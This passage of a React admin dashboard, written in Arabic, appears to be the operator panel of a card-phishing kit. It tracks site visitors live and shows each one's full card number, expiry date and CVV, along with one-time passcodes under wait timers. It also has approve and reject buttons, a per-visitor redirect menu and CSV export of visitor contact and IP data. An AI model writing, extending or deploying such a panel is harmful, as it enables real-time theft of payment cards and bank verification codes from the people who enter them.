                          const bColors = item.data.bank_name ? bankColors[item.data.bank_name] : null;
                          return (
                          <div
                            className="mt-2 rounded-xl p-4 space-y-2.5 shadow-lg border"
                            style={{
                              background: bColors ? bColors.header : "linear-gradient(135deg, #1e293b, #0f172a)",
                              borderColor: bColors ? bColors.border : "rgba(51,65,85,0.5)",
                            }}
                          >
                            {item.data.bank_name && bankLogos[item.data.bank_name] && (
                              <div className="flex items-center justify-center mb-1">
                                <img src={bankLogos[item.data.bank_name]} alt={item.data.bank_name} className="h-8 object-contain rounded bg-white/20 px-2 py-1" />
                              </div>
                            )}
                            <div className="flex items-center justify-between">
                              <span className="text-[12px] text-white/60 font-medium">البطاقة</span>
                              <span className="text-[15px] font-mono font-bold text-white tracking-widest" dir="ltr">
                                {item.data.card_full_number.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim()}
                              </span>
                            </div>
                            {item.data.card_expiry && (
                              <div className="flex items-center justify-between">
                                <span className="text-[12px] text-white/60 font-medium">الانتهاء</span>
                                <span className="text-[14px] font-mono text-white" dir="ltr">{item.data.card_expiry}</span>
                              </div>
                            )}
                            {item.data.card_cvv && (
                              <div className="flex items-center justify-between">
                                <span className="text-[12px] text-white/60 font-medium">CVV</span>
                                <span className="text-[16px] font-mono font-bold text-amber-300" dir="ltr">{item.data.card_cvv}</span>
                              </div>
                            )}
                            {item.data.bank_name && (
                              <div className="flex items-center justify-between">
                                <span className="text-[12px] text-white/60 font-medium">البنك</span>
                                <span className="text-[13px] text-white font-semibold">{item.data.bank_name}</span>
                              </div>
                            )}
                          </div>
                          );
                        })()}

                        {/* OTP code display */}
                        {item.type === "otp" && (
                          <div className="mt-1.5 flex items-center gap-2">
                            <span className={`${sm} font-mono font-bold text-violet-600 tracking-[0.3em] bg-violet-50 px-2 py-0.5 rounded-lg border border-violet-100`} dir="ltr">
                              {item.data.otp_code}
                            </span>
                            {item.status === "pending" && (
                              <OtpWaitTimer createdAt={item.created_at} />
                            )}
                          </div>
                        )}

                        {renderStatusActions(item, compact)}
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </div>
    );
  };


  const onlineCount = visitors.filter(v => v.is_online).length;
  const uniqueCountries = [...new Set(visitors.map(v => v.country))].filter(Boolean).sort();
  const uniqueDevices = [...new Set(visitors.map(v => v.device))].filter(Boolean);
  const uniqueBrowsers = [...new Set(visitors.map(v => v.browser))].filter(Boolean).sort();
  const searchLower = searchQuery.trim().toLowerCase();

  const hasAnyFilter = filterCountry !== "all" || filterDevice !== "all" || filterBrowser !== "all" || filterHasPending;
  const clearAllFilters = () => { setFilterCountry("all"); setFilterDevice("all"); setFilterBrowser("all"); setFilterHasPending(false); };

  const filtered = visitors.filter(v => {
    if (filter === "online" && !v.is_online) return false;
    if (filter === "offline" && v.is_online) return false;
    if (filterCountry !== "all" && v.country !== filterCountry) return false;
    if (filterDevice !== "all" && v.device !== filterDevice) return false;
    if (filterBrowser !== "all" && v.browser !== filterBrowser) return false;
    if (filterHasPending && !(getVisitorPendingOrders(v).length > 0 || getVisitorPendingOtps(v).length > 0)) return false;
    if (searchLower && !(
      (v.name || "").toLowerCase().includes(searchLower) ||
      (v.email || "").toLowerCase().includes(searchLower) ||
      (v.phone || "").includes(searchLower) ||
      (v.ip_address || "").includes(searchLower)
    )) return false;
    return true;
  });
  const pendingOtps = visitorOtpRequests.filter(o => o.status === "pending");

  const exportFilteredCSV = useCallback(() => {
    playChime("success");
    const headers = ["الاسم","البريد","الهاتف","الدولة","الجهاز","المتصفح","الصفحة الحالية","متصل","آخر ظهور","الزيارات","الصفحات","IP"];
    const rows = filtered.map(v => [
      displayName(v),
      v.email || "",
      v.phone || "",
      v.country || "",
      v.device || "",
      v.browser || "",
      v.current_page_label || v.current_page || "",
      v.is_online ? "نعم" : "لا",
      new Date(v.last_seen).toLocaleString("ar-SA"),
      v.total_visits,
      v.pages_viewed,
      v.ip_address || "",
    ]);
    const bom = "\uFEFF";
    const csv = bom + [headers, ...rows].map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\n");
    const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `visitors_${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  }, [filtered]);

  if (loading) {
    return (
      <div className="flex items-center justify-center h-[calc(100vh-120px)]">
        <div className="text-center">
          <div className="relative w-10 h-10 mx-auto mb-3">
            <div className="absolute inset-0 border-3 border-violet-500/30 rounded-full" />
            <div className="absolute inset-0 border-3 border-violet-500 border-t-transparent rounded-full animate-spin" />
          </div>
          <p className="text-[13px] text-slate-400">جاري تحميل الزوار...</p>
        </div>
      </div>
    );
  }

  return (
    <>
      {/* شريط التنبيهات الجانبي */}
      <div
        className="fixed left-4 top-1/2 -translate-y-1/2 z-50 flex flex-col gap-2 pointer-events-none"
        style={{ maxWidth: 260 }}
      >
        {sideAlerts.map(alert => (
          <div
            key={alert.id}
            className="pointer-events-auto bg-white border border-slate-200 rounded-xl shadow-lg shadow-slate-200/60 p-3 flex items-center gap-2.5 animate-in slide-in-from-left-4 duration-300"
            style={{ direction: "rtl" }}
          >
            <div className={`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 text-[16px] ${alert.isNew ? "bg-emerald-50" : "bg-violet-50"}`}>
              {alert.actionIcon}
            </div>
            <div className="flex-1 min-w-0">
              <p className="text-[12px] font-semibold text-slate-700 truncate">{alert.visitorName}</p>
              <p className={`text-[10px] font-medium ${alert.isNew ? "text-emerald-500" : "text-violet-500"}`}>
                {alert.isNew ? "🟢 زائر جديد دخل الموقع" : alert.actionLabel}
              </p>
            </div>
            <button
              onClick={() => removeSideAlert(alert.id)}
              className="shrink-0 w-5 h-5 rounded-full bg-slate-100 flex items-center justify-center hover:bg-slate-200 transition-colors"
            >
              <X className="w-3 h-3 text-slate-400" />
            </button>
          </div>
        ))}
      </div>

      <div className="flex flex-col gap-3 h-[calc(100vh-120px)]" dir="rtl">

        {/* شريط المعلومات العلوي */}
        <div className="flex items-center justify-between gap-3 shrink-0">
          <div className="flex items-center gap-2.5">
            <div className="flex items-center gap-2.5">
              <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-blue-50 border border-blue-100/80">
                <Users className="w-3 h-3 text-blue-400" />
                <span className="text-[12px] font-bold text-blue-600">{visitors.length}</span>
                <span className="text-[10px] text-slate-400">إجمالي</span>
              </div>
              {pendingOtps.length > 0 && (
                <div className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg bg-gradient-to-r from-violet-50 to-purple-50 border border-violet-200/80 animate-pulse">
                  <Shield className="w-3 h-3 text-violet-500" />
                  <span className="text-[12px] font-bold text-violet-600">{pendingOtps.length}</span>
                  <span className="text-[10px] text-violet-400">OTP</span>
                </div>
              )}
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={e => { createRipple(e); deleteAll(); }}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors relative overflow-hidden"
            >
              <WifiOffBulk className="w-3.5 h-3.5" /> حذف غير المتصلين ({visitors.filter(v => !v.is_online).length})
            </button>
            <button
              onClick={e => { createRipple(e); playChime("click"); setSelectMode(!selectMode); if (selectMode) setSelectedIds(new Set()); }}
              className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-[11px] font-medium transition-all relative overflow-hidden ${
                selectMode ? "bg-blue-500 text-white" : "bg-slate-100 text-slate-600 hover:bg-slate-200"
              }`}
            >
              <CheckSquare className="w-3.5 h-3.5" />
              {selectMode ? "إلغاء التحديد" : "تحديد محادثات"}
            </button>
            {selectMode && selectedIds.size > 0 && (
              <button
                onClick={deleteSelected}
                className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-red-500 text-white text-[11px] font-medium hover:bg-red-600 transition-colors"
              >
                <Trash2 className="w-3.5 h-3.5" /> حذف المحدد ({selectedIds.size})
              </button>
            )}
          </div>
        </div>

        {/* المحتوى الرئيسي */}
        <div className="flex flex-col lg:flex-row gap-4 flex-1 min-h-0 overflow-auto lg:overflow-hidden">

          {/* قائمة الزوار */}
          <div className="w-full lg:w-[280px] xl:w-[300px] shrink-0 flex flex-col gap-2 overflow-y-auto scrollbar-thin">
            <div className="bg-gradient-to-b from-white to-slate-50/80 rounded-2xl border border-slate-200/80 shadow-sm overflow-hidden shrink-0">
              {/* Search */}
              {!showTrash && (
                <div className="p-3 pb-0">
                  <div className="relative">
                    <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400 pointer-events-none" />
                    <input
                      type="text"
                      value={searchQuery}
                      onChange={e => setSearchQuery(e.target.value)}
                      placeholder="🔍 بحث بالاسم أو البريد أو الهاتف..."
                      className="w-full py-2.5 pr-9 pl-8 rounded-xl bg-white border border-slate-200 text-[11px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-200 focus:border-blue-300 transition-all shadow-sm"
                    />
                    {searchQuery && (
                      <button
                        onClick={() => setSearchQuery("")}
                        className="absolute left-2.5 top-1/2 -translate-y-1/2 w-5 h-5 rounded-full bg-slate-200 flex items-center justify-center hover:bg-slate-300 transition-colors"
                      >
                        <X className="w-3 h-3 text-slate-500" />
                      </button>
                    )}
                  </div>
                </div>
              )}

              {/* Tabs + Actions */}
              <div className="p-3 space-y-2">
                {!showTrash && (
                  <div className="flex gap-0.5 bg-slate-100 rounded-xl p-0.5">
                    {[
                      { key: "all" as const, label: "الكل", count: visitors.length, emoji: "👥" },
                      { key: "online" as const, label: "متصل", count: onlineCount, emoji: "🟢" },
                      { key: "offline" as const, label: "غير متصل", count: visitors.length - onlineCount, emoji: "⚫" },
                    ].map(tab => (
                      <button
                        key={tab.key}
                        onClick={() => setFilter(tab.key)}
                        className={`flex-1 py-2 rounded-lg text-[10px] font-bold transition-all ${
                          filter === tab.key 
                            ? "bg-white text-slate-800 shadow-md" 
                            : "text-slate-500 hover:text-slate-700 hover:bg-white/50"
                        }`}
                      >
                        {tab.emoji} {tab.label} ({tab.count})
                      </button>
                    ))}
                  </div>
                )}




                <div className="flex gap-1.5">
                  <button
                    onClick={() => { playChime("click"); setShowTrash(!showTrash); setSelectMode(false); setSelectedIds(new Set()); }}
                    className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-xl text-[10px] font-semibold transition-all ${
                      showTrash ? "bg-slate-800 text-white shadow-md" : "bg-slate-100 text-slate-500 hover:bg-slate-200"
                    }`}
                  >
                    <Archive className="w-3.5 h-3.5" />
                    {showTrash ? "↩ العودة" : `🗑 المحذوفات (${deletedVisitors.length})`}
                  </button>
                  {!showTrash && (
                    <button
                      onClick={e => { createRipple(e); exportFilteredCSV(); }}
                      className="flex items-center justify-center gap-1 px-3 py-2 rounded-xl bg-emerald-500 text-white text-[10px] font-semibold hover:bg-emerald-600 transition-all shadow-sm relative overflow-hidden"
                    >
                      <Download className="w-3.5 h-3.5" /> CSV
                    </button>
                  )}
                </div>

                {!showTrash && (filter !== "all" || hasAnyFilter) && filtered.length !== visitors.length && (
                  <div className="flex items-center justify-center gap-1.5 py-1.5 rounded-lg bg-blue-50 border border-blue-100">
                    <span className="text-[10px] font-bold text-blue-600">{filtered.length}</span>
                    <span className="text-[10px] text-blue-400">من</span>
                    <span className="text-[10px] font-bold text-blue-600">{visitors.length}</span>
                    <span className="text-[10px] text-blue-400">زائر</span>
                  </div>
                )}
              </div>
            </div>

            {showTrash ? (
              <div className="space-y-1.5">
                {deletedVisitors.length > 0 && (
                  <div className="flex gap-1.5 mb-2">
                    <button
                      onClick={() => setConfirmDelete({ type: "all" })}
                      className="flex-1 flex items-center justify-center gap-1 py-2 rounded-xl bg-red-50 text-red-500 text-[10px] font-medium hover:bg-red-100 transition-colors"
                    >
                      <Trash2 className="w-3 h-3" /> حذف نهائي للكل
                    </button>
                    <button
                      onClick={restoreAllVisitors}
                      className="flex-1 flex items-center justify-center gap-1 py-2 rounded-xl bg-emerald-50 text-emerald-600 text-[10px] font-medium hover:bg-emerald-100 transition-colors"
                    >
                      <RotateCcw className="w-3 h-3" /> استعادة الكل
                    </button>
                  </div>
                )}
                {deletedVisitors.map(visitor => (
                  <div key={visitor.id} className="bg-white rounded-xl border border-slate-100 p-2.5">
                    <div className="flex items-center gap-2">
                      <div className={`w-8 h-8 rounded-full bg-gradient-to-br ${getAvatarColor(displayName(visitor)).bg} flex items-center justify-center text-[12px] font-bold ${getAvatarColor(displayName(visitor)).text} shadow-sm`}>
                        {displayName(visitor)[0]}
                      </div>
                      <div className="flex-1 min-w-0">
                        <span className="text-[12px] font-semibold text-slate-600 truncate block">{displayName(visitor)}</span>
                        <span className="text-[9px] text-slate-400">{visitor.device === "mobile" ? "Mobile" : "Desktop"}</span>
                      </div>
                      <div className="flex gap-1 shrink-0">
                        <button onClick={() => restoreVisitor(visitor.id)} className="p-1 rounded-lg bg-emerald-50 text-emerald-500 hover:bg-emerald-100 transition-colors">
                          <RotateCcw className="w-3 h-3" />
                        </button>
                        <button onClick={() => setConfirmDelete({ type: "single", id: visitor.id })} className="p-1 rounded-lg bg-red-50 text-red-500 hover:bg-red-100 transition-colors">
                          <Trash2 className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
                {!deletedVisitors.length && (
                  <div className="text-center py-8 text-slate-400 text-[12px]">سلة المحذوفات فارغة</div>
                )}
              </div>
            ) : (
              <div className="space-y-2">
                <AnimatePresence mode="popLayout">
                <LayoutGroup>
                {filtered.map(visitor => {
                  const isSelected = selected?.id === visitor.id;
                  const hasPendingOrder = getVisitorPendingOrders(visitor).length > 0;
                  const hasPendingOtp = getVisitorPendingOtps(visitor).length > 0;
                  const hasPending = hasPendingOrder || hasPendingOtp;
                  return (
                    <motion.div
                      key={visitor.id}
                      layout
                      initial={{ opacity: 0, y: 20, scale: 0.95 }}
                      animate={{ opacity: 1, y: 0, scale: 1 }}
                      exit={{ opacity: 0, scale: 0.9, y: -10 }}
                      transition={{ type: "spring", stiffness: 400, damping: 30, mass: 0.8, delay: Math.min(filtered.indexOf(visitor) * 0.05, 0.5) }}
                    >
                    <SwipeToDelete
                      key={visitor.id}
                      onDelete={() => deleteSingle(visitor.id)}
                    >
                    <div
                      onClick={() => {
                        if (!selectMode) {
                          playChime(isSelected ? "whoosh" : "pop");
                          setSelected(isSelected ? null : visitor);
                        }
                      }}
                      className={`rounded-2xl border transition-all duration-200 p-2.5 cursor-pointer ${
                        isSelected ? "border-blue-400 bg-gradient-to-l from-blue-50 to-blue-100/60 shadow-lg ring-1 ring-blue-300/40" 
                        : hasPending ? "border-red-300 bg-gradient-to-l from-red-50/80 to-orange-50/40 shadow-md ring-1 ring-red-200/50" 
                        : visitor.is_online ? "border-emerald-200/80 bg-gradient-to-l from-emerald-50/40 to-white shadow-sm hover:shadow-md hover:border-emerald-300"
                        : "border-slate-100 bg-white/80 hover:shadow-sm hover:border-slate-200"
                      } ${flashVisitorId === visitor.id ? "ring-2 ring-violet-400 bg-violet-50/60" : ""}`}
                    >
                      {/* Row 1: Avatar + Name + Status */}
                      <div className="flex items-center gap-2.5">
                        {selectMode && (
                          <button onClick={e => { e.stopPropagation(); toggleSelect(visitor.id); }} className="shrink-0">
                            {selectedIds.has(visitor.id)
                              ? <CheckSquare className="w-4 h-4 text-blue-500" />
                              : <Square className="w-4 h-4 text-slate-300" />}
                          </button>
                        )}
                        <div className="relative shrink-0">
                          <div className={`w-9 h-9 rounded-xl flex items-center justify-center text-[13px] font-bold shadow-sm ${
                            hasPending ? "bg-gradient-to-br from-red-100 to-orange-100 text-red-600"
                            : `bg-gradient-to-br ${getAvatarColor(displayName(visitor)).bg} ${getAvatarColor(displayName(visitor)).text}`
                          }`}>
                            {displayName(visitor)[0]}
                          </div>
                          <span className={`absolute -bottom-0.5 -left-0.5 w-2.5 h-2.5 rounded-full border-2 border-white ${
                            visitor.is_online ? "bg-emerald-400" : "bg-slate-300"
                          }`} />
                          {hasPendingOrder && (
                            <span className="absolute -top-1 -right-1 flex items-center justify-center">
                              <span className="absolute w-3.5 h-3.5 rounded-full bg-red-400 animate-ping opacity-40" />
                              <span className="relative w-3.5 h-3.5 rounded-full bg-red-500 border-[1.5px] border-white flex items-center justify-center">
                                <AlertCircle className="w-2 h-2 text-white" />
                              </span>
                            </span>
                          )}
                          {hasPendingOtp && !hasPendingOrder && (
                            <span className="absolute -top-1 -right-1 flex items-center justify-center">
                              <span className="absolute w-3.5 h-3.5 rounded-full bg-violet-400 animate-ping opacity-40" />
                              <span className="relative w-3.5 h-3.5 rounded-full bg-violet-500 border-[1.5px] border-white flex items-center justify-center">
                                <Shield className="w-2 h-2 text-white" />
                              </span>
                            </span>
                          )}
                        </div>

                        <div className="flex-1 min-w-0">
                          {/* Name row */}
                          <div className="flex items-center justify-between gap-1">
                            <div className="flex items-center gap-1.5 min-w-0">
                              {visitor.country && <span className="text-[14px] shrink-0 leading-none">{countryFlag(visitor.country)}</span>}
                              <span className="text-[12px] font-bold text-slate-800 truncate">{displayName(visitor)}</span>
                              {hasPendingOrder && (
                                <span className="text-[7px] font-bold text-red-600 bg-red-100 px-1 py-0.5 rounded-full shrink-0 animate-pulse">
                                  ينتظر إجراء
                                </span>
                              )}
                              {hasPendingOtp && !hasPendingOrder && (() => {
                                const otps = getVisitorPendingOtps(visitor);
                                const oldestOtp = otps.length > 0 ? otps[otps.length - 1] : null;
                                return (
                                  <span className="inline-flex items-center gap-1 text-[7px] font-bold text-violet-600 bg-violet-100 px-1 py-0.5 rounded-full shrink-0 animate-pulse">
                                    🔐 OTP
                                    {oldestOtp && <OtpWaitTimer createdAt={oldestOtp.created_at} />}
                                  </span>
                                );
                              })()}
                            </div>
                            {visitor.is_online
                              ? <span className="text-[8px] font-semibold text-emerald-600 bg-emerald-50 px-1.5 py-0.5 rounded-full shrink-0 flex items-center gap-0.5"><span className="w-1 h-1 rounded-full bg-emerald-500 animate-pulse" />متصل</span>
                              : <span className="text-[8px] font-medium text-slate-400 bg-slate-50 px-1.5 py-0.5 rounded-full shrink-0">غير متصل</span>}
                          </div>

                          {/* Contact info */}
                          {(visitor.email || visitor.phone) && (
                            <div className="flex items-center gap-1.5 mt-0.5">
                              {visitor.phone && (
                                <span className="text-[8px] text-violet-500 bg-violet-50 px-1.5 py-0.5 rounded font-mono" dir="ltr">📱{visitor.phone}</span>
                              )}
                              {visitor.email && (
                                <span className="text-[8px] text-blue-500 bg-blue-50 px-1.5 py-0.5 rounded truncate max-w-[100px]">📧{visitor.email}</span>
                              )}
                            </div>
                          )}
                        </div>
                      </div>

                      {/* Row 2: Page + Time + Session */}
                      <div className="flex items-center gap-2 mt-1.5 mr-[46px] bg-slate-50/60 rounded-lg px-2 py-1">
                        <div className="flex items-center gap-0.5 flex-1 min-w-0">
                          <Eye className="w-2.5 h-2.5 text-blue-400 shrink-0" />
                          <span className="text-[9px] text-blue-500 font-medium truncate">{visitor.current_page_label}</span>
                        </div>
                        <div className="flex items-center gap-0.5 shrink-0">
                          <Clock className="w-2.5 h-2.5 text-slate-300" />
                          <span className="text-[8px] text-slate-400">{getTimeDiff(visitor.last_seen)}</span>
                        </div>
                        {visitor.session_start && (
                          <div className="flex items-center gap-0.5 shrink-0 border-r border-slate-200 pr-2">
                            <span className="text-[8px]">⏱</span>
                            <SessionTimer startTime={visitor.session_start} />
                          </div>
                        )}
                      </div>
                      {/* Inline approve/reject buttons - orders only */}
                      {(() => {
                        const vPendingOrders = getVisitorPendingOrders(visitor);
                        if (!vPendingOrders.length) return null;
                        return (
                          <div className="mt-2 mr-[46px] space-y-1.5">
                            {vPendingOrders.map(order => (
                              <div key={order.id} className="rounded-xl bg-gradient-to-l from-amber-50/80 to-orange-50/50 border border-amber-200/60 p-2">
                                <div className="flex items-center gap-1.5 mb-1">
                                  <CreditCard className="w-3 h-3 text-amber-500 shrink-0" />
                                  <span className="text-[9px] text-slate-700 flex-1 truncate font-bold">
                                    {order.cardholder_name || order.email || "زائر"}
                                  </span>
                                  <span className="text-[9px] font-bold text-amber-600">{order.total} ر.س</span>
                                </div>
                                <div className="flex items-center gap-1.5 mb-1.5 mr-[18px]">
                                  <span className="text-[8px] text-slate-500">
                                    {order.card_brand} •••• {order.card_last4}
                                  </span>
                                  {order.bank_name && <span className="text-[8px] text-slate-400">| {order.bank_name}</span>}
                                </div>
                                <div className="flex gap-1.5">
                                  <button
                                    onClick={(e) => approveOrderInline(order.id, e)}
                                    className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-gradient-to-r from-emerald-500 to-emerald-600 text-white text-[9px] font-bold hover:from-emerald-600 hover:to-emerald-700 active:scale-[0.97] transition-all shadow-sm shadow-emerald-500/20"
                                  >
                                    <CheckCircle className="w-3 h-3" /> موافقة
                                  </button>
                                  <button
                                    onClick={(e) => rejectOrderInline(order.id, e)}
                                    className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-gradient-to-r from-red-500 to-red-600 text-white text-[9px] font-bold hover:from-red-600 hover:to-red-700 active:scale-[0.97] transition-all shadow-sm shadow-red-500/20"
                                  >
                                    <XCircle className="w-3 h-3" /> رفض
                                  </button>
                                </div>
                              </div>
                            ))}
                          </div>
                        );
                      })()}
                    </div>
                    </SwipeToDelete>
                    </motion.div>
                  );
                })}
                </LayoutGroup>
                </AnimatePresence>
                {!filtered.length && (
                  <div className="text-center py-8 text-slate-400 text-[12px]">لا يوجد زوار</div>
                )}
              </div>
            )}
          </div>

          {/* لوحة التفاصيل - Desktop */}
          <div className="flex-1 hidden lg:block min-h-0">
            {selected ? (
              <div className="bg-white rounded-2xl border border-slate-200 h-full flex flex-col overflow-hidden">
                <div className="p-4 border-b border-slate-100 shrink-0">
                  <div className="flex items-center gap-3">
                    <div className="relative">
                      <div className={`w-12 h-12 rounded-2xl flex items-center justify-center text-[18px] font-bold ${
                        selected.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-100 text-slate-400"
                      }`}>
                        {(selected.name || "ز")[0]}
                      </div>
                      <span className={`absolute -bottom-1 -left-1 w-3.5 h-3.5 rounded-full border-[2.5px] border-white ${
                        selected.is_online ? "bg-emerald-400" : "bg-slate-300"
                      }`} />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center gap-2 flex-wrap">
                        <h2 className="text-[20px] font-bold text-slate-800">{displayName(selected)}</h2>
                        <span className={`inline-flex items-center gap-1.5 text-[11px] font-semibold px-2.5 py-1 rounded-full border ${
                          selected.is_online
                            ? "bg-emerald-50 text-emerald-600 border-emerald-200"
                            : "bg-slate-50 text-slate-400 border-slate-200"
                        }`}>
                          {selected.is_online
                            ? <><span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> متصل</>
                            : <><span className="w-1.5 h-1.5 rounded-full bg-slate-300" /> غير متصل</>}
                        </span>
                        {pendingOtps.length > 0 && (
                          <span className="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-0.5 rounded-full bg-violet-100 text-violet-600 animate-pulse">
                            🔐 {pendingOtps.length} OTP ينتظر
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-1.5 mt-1">
                        <Eye className="w-3.5 h-3.5 text-blue-400" />
                        <span className="text-[13px] text-blue-500 font-medium">يتصفح: {selected.current_page_label}</span>
                      </div>
                      {(selected.email || selected.phone) && (
                        <div className="flex items-center gap-4 mt-1.5 flex-wrap">
                          {selected.email && (
                            <div className="flex items-center gap-1.5">
                              <Globe className="w-3 h-3 text-slate-400" />
                              <span className="text-[11px] text-slate-500" dir="ltr">{selected.email}</span>
                            </div>
                          )}
                          {selected.phone && (
                            <div className="flex items-center gap-1.5">
                              <Smartphone className="w-3 h-3 text-slate-400" />
                              <span className="text-[11px] text-slate-500" dir="ltr">{selected.phone}</span>
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                    <button
                      onClick={() => deleteSingle(selected.id)}
                      className="p-2 rounded-xl bg-red-50 text-red-400 hover:bg-red-100 transition-colors"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <div className="p-4 space-y-3 flex-1 overflow-y-auto scrollbar-thin">


                  <div className="rounded-2xl overflow-hidden bg-gradient-to-br from-slate-50 to-blue-50/50 border border-slate-100 shadow-sm">
                    <div className="px-4 py-2.5 flex items-center gap-2 border-b border-slate-100/80">
                      <div className="w-6 h-6 rounded-full bg-blue-100 flex items-center justify-center">
                        <User className="w-3.5 h-3.5 text-blue-500" />
                      </div>
                      <span className="text-[12px] font-bold text-slate-700">معلومات الزائر</span>
                    </div>
                    <div className="p-3 grid grid-cols-2 gap-2">
                      {[
                        { label: "الجهاز", value: selected.device === "mobile" ? "📱 جوال" : "🖥 كمبيوتر", color: "from-violet-50 to-purple-50", borderColor: "border-violet-100/60" },
                        { label: "المتصفح", value: `🌐 ${selected.browser}`, color: "from-sky-50 to-cyan-50", borderColor: "border-sky-100/60" },
                        { label: "الدولة", value: `${countryFlag(selected.country)} ${selected.country}`, color: "from-emerald-50 to-green-50", borderColor: "border-emerald-100/60" },
                        { label: "آخر نشاط", value: `⏱ ${getTimeDiff(selected.last_seen)}`, color: "from-amber-50 to-orange-50", borderColor: "border-amber-100/60" },
                      ].map(info => (
                        <div key={info.label} className={`bg-gradient-to-br ${info.color} rounded-xl p-3 border ${info.borderColor} transition-all hover:scale-[1.02]`}>
                          <p className="text-[9px] font-medium text-slate-400 mb-0.5">{info.label}</p>
                          <p className="text-[13px] font-semibold text-slate-700 truncate">{info.value}</p>
                        </div>
                      ))}
                    </div>
                  </div>


                  <button onClick={toggleAllSections} className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded-lg bg-slate-50 text-slate-500 text-[11px] font-medium hover:bg-slate-100 transition-colors">
                    {allOpen ? <><ChevronUp className="w-3.5 h-3.5" /> طي جميع الأقسام</> : <><ChevronDown className="w-3.5 h-3.5" /> فتح جميع الأقسام</>}
                  </button>

                  {renderTimeline(false)}
                  {renderRedirectDropdown(selected, false)}

                  <button
                    onClick={() => deleteSingle(selected.id)}
                    className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl bg-red-50 text-red-500 text-[12px] font-medium hover:bg-red-100 transition-colors"
                  >
                    <Trash2 className="w-4 h-4" /> مسح محادثة الزائر
                  </button>
                </div>
              </div>
            ) : (
              <div className="bg-white rounded-2xl border-2 border-dashed border-slate-200 h-full flex items-center justify-center">
                <div className="text-center">
                  <div className="w-16 h-16 rounded-2xl bg-slate-50 flex items-center justify-center mx-auto mb-3">
                    <Users className="w-8 h-8 text-slate-300" />
                  </div>
                  <p className="text-[15px] font-medium text-slate-400">اختر زائر لعرض التفاصيل</p>
                  <p className="text-[12px] text-slate-300 mt-1">اضغط على أي زائر من القائمة</p>
                </div>
              </div>
            )}
          </div>

          {/* Mobile Detail Sheet */}
          <Sheet open={!!selected && isMobile} onOpenChange={(open) => { if (!open) setSelected(null); }}>
            <SheetContent side="bottom" className="h-[85vh] rounded-t-2xl p-0 overflow-hidden" dir="rtl">
              {selected && (
                <div className="flex flex-col h-full">
                  {/* Header */}
                  <div className="p-4 border-b border-slate-100 shrink-0">
                    <div className="flex items-center gap-3">
                      <button
                        onClick={() => setSelected(null)}
                        className="p-1.5 rounded-lg bg-slate-100 text-slate-500 hover:bg-slate-200 transition-colors shrink-0"
                      >
                        <ArrowRight className="w-4 h-4" />
                      </button>
                      <div className="relative shrink-0">
                        <div className={`w-10 h-10 rounded-full bg-gradient-to-br ${getAvatarColor(displayName(selected)).bg} flex items-center justify-center text-[15px] font-bold ${getAvatarColor(displayName(selected)).text} shadow-sm`}>
                          {displayName(selected)[0]}
                        </div>
                        <span className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-white ${
                          selected.is_online ? "bg-emerald-400" : "bg-slate-300"
                        }`} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <h3 className="text-[14px] font-bold text-slate-800 truncate">{displayName(selected)}</h3>
                          <span className={`text-[9px] font-medium px-1.5 py-0.5 rounded-full shrink-0 ${
                            selected.is_online ? "bg-emerald-50 text-emerald-600" : "bg-slate-50 text-slate-400"
                          }`}>
                            {selected.is_online ? "متصل" : "غير متصل"}
                          </span>
                        </div>
                        <div className="flex items-center gap-1 mt-0.5">
                          <Eye className="w-2.5 h-2.5 text-blue-400" />
                          <span className="text-[10px] text-blue-500">{selected.current_page_label}</span>
                        </div>
                        {(selected.email || selected.phone) && (
                          <div className="flex items-center gap-3 mt-1 flex-wrap">
                            {selected.email && (
                              <div className="flex items-center gap-1">
                                <Globe className="w-2.5 h-2.5 text-slate-400" />
                                <span className="text-[9px] text-slate-500" dir="ltr">{selected.email}</span>
                              </div>
                            )}
                            {selected.phone && (
                              <div className="flex items-center gap-1">
                                <Smartphone className="w-2.5 h-2.5 text-slate-400" />
                                <span className="text-[9px] text-slate-500" dir="ltr">{selected.phone}</span>
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                      <button
                        onClick={() => deleteSingle(selected.id)}
                        className="p-1.5 rounded-lg bg-red-50 text-red-400 hover:bg-red-100 transition-colors shrink-0"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>

                  {/* Redirect dropdown in hero */}
                  <div className="px-3 pb-1">
                    {renderRedirectDropdown(selected, true)}
                  </div>

                  {/* Inline approve/reject buttons for pending orders */}
                  {(() => {
                    const vPendingOrders = getVisitorPendingOrders(selected);
                    if (!vPendingOrders.length) return null;
                    return (
                      <div className="px-3 pb-2 space-y-1.5">
                        {vPendingOrders.map(order => (
